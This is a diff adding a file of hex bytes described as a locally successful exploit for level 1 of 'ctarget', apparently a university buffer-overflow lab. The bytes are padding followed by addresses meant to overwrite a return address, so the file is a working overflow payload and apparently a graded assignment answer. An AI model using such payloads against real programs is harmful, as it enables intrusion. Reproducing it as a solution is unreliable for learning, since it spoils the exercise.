@@ -1,0 +1,5 @@
+# Locally successful exploit for level 1 of ctarget
+
+f4 f4 f4 f4 f4 f4 f4 f4 f4 f4 f4 f4 f4 f4 f4 f4 
+f4 f4 f4 f4 f4 f4 f4 f4 55 68 5f f0 00 00 00 00
+55 68 5f e0 00 00 00 00 23 29 40 00
